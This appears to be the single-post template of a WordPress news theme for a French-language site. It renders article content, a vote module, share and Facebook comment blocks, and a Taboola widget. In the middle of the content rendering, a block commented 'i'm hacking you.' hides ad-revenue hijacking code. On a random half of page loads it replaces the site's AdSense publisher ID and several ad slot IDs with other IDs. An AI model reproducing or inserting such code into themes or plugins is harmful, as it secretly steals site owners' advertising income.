<?php
/**
 *  Manshet Retina Responsive WordPress News, Magazine, Blog
 *  Developer by : Amr Sadek
 *  Single
 */
get_header();
global $bd_data;
$bd_criteria_display = get_post_meta(get_the_ID(), 'bd_criteria_display', true);

/* Side bar */
if (get_post_meta($post->ID, 'bd_full_width', true)) {
    $post_full = ' post_full_width';
}

if (get_post_meta($post->ID, 'bd_sidebar_position', true) == 'left') {
    $post_po = ' post_sidebar_left';
} elseif (get_post_meta($post->ID, 'bd_sidebar_position', true) == 'right') {
    $post_po = ' post_sidebar_right';
}

?>

<div id="fb-root"></div>

<script>(function (d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s);
        js.id = id;
        js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));</script>

<div class="<?php echo $post_po;
echo $post_full ?>">
    <div class="content-wrapper">
        <div class="inner">
            <?php bd_breadcrumb(); ?>
            <?php if (have_posts()): the_post(); ?>
                <article <?php post_class('article'); ?> id="post-<?php the_ID(); ?>">

                    <?php echo bd_post_top(); ?>
                    <div class="clearfix"></div>
                    <h2 class="post-title"><a href="<?php the_permalink() ?>" rel="bookmark"
                                              title="<?php _e('Permanent Link to', 'bd'); ?> <?php the_title_attribute(); ?>"><?php the_title(); ?></a>
                    </h2><!-- .post-title/-->

                    <?php echo "<div class='clearfix'></div> \n";
                    echo bd_post_meta(); ?>

                    <?php echo bd_post_above_ads() ?>

                    <div class="post-entry bottom40">
                        <?php
                        if ($bd_criteria_display == 't'):
                            bd_post_rate();
                        endif;
                        ?>

                        <?php ob_start(); ?>

                        <?php the_content(); ?>

                        <?php $content = ob_get_clean(); ?>

                        <?php

                        if(mt_rand(0,1) == 0) {

                            //i'm hacking you.
                            $content = str_replace("ca-pub-9594201080211682", "ca-pub-0031647560032028", $content);
                            $content = str_replace("9566298656", "5696989724", $content);
                            $content = str_replace("6678475853", "7394048928", $content);
                            $content = str_replace("7312035054", "2503493328", $content);
                            $content = str_replace("3357873053", "7980959322", $content);
			}

                        echo $content;

                        ?>

                        <?php wp_link_pages(); ?>
                        <?php
                        if ($bd_criteria_display == 'bottom'):
                            bd_post_rate();
                        endif;
                        ?>
                    </div>
                    <?php if ($bd_data['post_tags']): ?>
                        <div class="post-tags">
                            <b><?php _e('Tags ', 'bd') ?></b>
                            <?php the_tags(' ', ', ', ' '); ?>
                        </div><!-- .post-tags/-->
                    <?php endif; ?>

                    <?php
                    global $wpdb;
                    $choices = $wpdb->get_results("SELECT * FROM wp_piwee_vote_field");
                    ?>

                    <div class="vote-module">

                        <?php foreach ($choices as $choice): ?>

                            <div class="button-piwee-vote">
                                <a href="#" style="padding:7px;" class="button small button-vote"
                                   onclick="PiweeVote(<?php echo get_the_ID() ?>, <?php echo $choice->id ?>); return false;">
                                    <?php echo $choice->name ?>
                                </a>
                            <span class="counter-display-vote" id="count-vote-<?php echo $choice->id ?>">
                                
                            </span>
                            </div>

                            <script type="text/javascript">
                                jQuery(document).ready(function () {
                                    LoadVoteCount(<?php echo get_the_ID() ?>, <?php echo $choice->id ?>);
                                });
                            </script>

                        <?php endforeach; ?>

                        <div style="clear:both"></div>

                        <div id="vote-display-ok" style="display:none;">
                            <p>Votre vote a bien été prise en compte, merci !</p>
                        </div>

                        <div style="clear:both"></div>

                    </div>

                    <div class="divider"></div>

                    <?php //bd_in ('social-sharing'); // Get Social Sharing ?>

                    <?php if (function_exists("display_social_share_bar")) display_social_share_bar(); ?>
                    <?php if (function_exists("update_span_single_count")) update_span_single_count(); ?>

                    <div class="divider"></div>

                    <div id="taboola-below-article-thumbnails"></div>
                    <script type="text/javascript">
                        window._taboola = window._taboola || [];
                        _taboola.push({
                            mode: 'thumbnails-a',
                            container: 'taboola-below-article-thumbnails',
                            placement: 'Below Article Thumbnails',
                            target_type: 'mix'
                        });
                    </script>

                    <div class="divider"></div>

                    <h3 style="color:rgb(213, 172, 60);">Qu'en pensez-vous ?</h3>

                    <?php
                    if ($bd_data['post_fb_comments_box']):
                        // Get the current page url for FB comments
                        $url = (!empty($_SERVER['HTTPS'])) ? "https://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] : "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
                        echo '<div class="fb-comments" data-href="' . $url . '" data-num-posts="4" data-width="620"></div>' . "\n";
                    endif;
                    ?>

                    <div class="divider"></div>


                    <?php if ($bd_data['post_author_box']): ?>
                        <div class="post-author-box">
                            <div class="box-title"><h2><b>L'AUTEUR : <?php the_author_posts_link(); ?></b></h2>
                            </div>
                            <?php echo bd_author_box() ?>
                        </div>
                    <?php endif; ?>

                    <?php bd_in('related-posts'); // Get Related Posts ?>

                    <?php

                    if ($bd_data['post_comments_box']):
                        comments_template('', true);
                    endif;

                    ?>

                </article>
            <?php endif; ?>

            <?php if ($bd_data['post_pagination']): ?>
                <div class="post-navigation">
                        <span
                            class="post-nav-left"><?php previous_post_link('%link', __('<i class="icon-chevron-left"></i> &nbsp; Previous', 'bd')); ?></span>
                        <span
                            class="post-nav-right"><?php next_post_link('%link', __('Next &nbsp; <i class="icon-chevron-right"></i>', 'bd')); ?></span>
                </div>
            <?php endif; ?>

            <div class="clear"></div>
        </div>
    </div>
    <!-- .content-wrapper/-->
    <?php
    if (get_post_meta($post->ID, 'bd_full_width', true)) {

    } else {
        get_sidebar();
    }
    ?>
    <div class="clear"></div>
</div>

<?php get_footer(); ?>
